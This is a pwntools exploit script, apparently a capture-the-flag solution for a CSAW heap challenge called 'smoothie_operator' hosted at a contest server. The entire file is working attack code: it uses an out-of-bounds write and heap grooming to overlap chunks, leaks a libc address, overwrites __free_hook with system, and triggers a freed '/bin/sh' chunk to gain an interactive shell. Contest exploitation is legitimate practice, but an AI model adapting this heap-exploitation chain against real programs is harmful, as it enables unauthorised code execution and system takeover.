from pwn import *
context.terminal = ["tmux", "neww"]
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add_complaint(content):
    r.sendlineafter(b'  > ', b'8')
    r.sendlineafter(b'your complaint:', content)

def delete_complaint(idx):
    r.sendlineafter(b'  > ', b'9')
    r.sendlineafter(b'  > ', str(idx).encode())

def edit_complaint(idx, content):
    r.sendlineafter(b'  > ', b'10')
    r.sendlineafter(b'  > ', str(idx).encode())
    r.sendlineafter(b'complaint:\n', content)

def show_complaint():
    r.sendlineafter(b'  > ', b'7')

def add_order(t, order_num, price=1):
    type_list = ['smoothie', 'monster', 'pastry']
    assert t in type_list
    idx = type_list.index(t) + 1

    r.sendlineafter(b'  > ', b'2')
    r.sendlineafter(b'  > ', str(idx).encode())
    r.sendlineafter(b': $', str(price).encode())
    r.sendlineafter(b': #', order_num)

    if idx == 2:
        for i in range(7):
            r.sendlineafter(b'? ', b'n')

    else:
        raise NotImplementedError()

def oob_write(order_num, val):
    r.sendlineafter(b'  > ', b'3')
    r.sendlineafter(b'  > ', order_num)
    r.sendlineafter(b': $', b'1')
    r.sendlineafter(b': ', b'0')
    r.sendlineafter(b': ', str(val).encode())

#r = process("./smoothie_operator")
r = remote("pwn.chal.csaw.io", 5022)
#r = gdb.debug("./smoothie_operator", "b *0x00555555554000+0x475c\nc\n")
#r = gdb.debug("./smoothie_operator")

add_order('monster', b'1')
#r.sendline(b'A'*0x20)

# heap fengshui and oob write to obtain chunk overlapping
add_complaint(b'A'*0x200)
add_complaint(b'A'*0x3c0)
oob_write(b'1', 0x5e1)
delete_complaint(2)

# use chunk overlapping to leak libc address
add_complaint(b'A'*0x3c0)
show_complaint()
r.recvuntil(b'1: ')
libc_base = u64(r.recv(8)) - 0x7ffff7dbdbe0 + 0x007ffff7bd1000
log.info("libc_base: %#x" % libc_base)
__free_hook = libc_base + libc.symbols['__free_hook']
log.info("__free_hook: %#x" % __free_hook)
system = libc_base + libc.symbols['system']
log.info("system: %#x" % system)

# overlap with complaint 1
add_complaint(b'B'*0x1d0)
add_complaint(b'C'*0x100)
edit_complaint(1, p64(__free_hook-8) + p64(0x100)*2)
edit_complaint(4, b'/bin/sh\x00' + p64(system))

delete_complaint(4)



r.interactive()
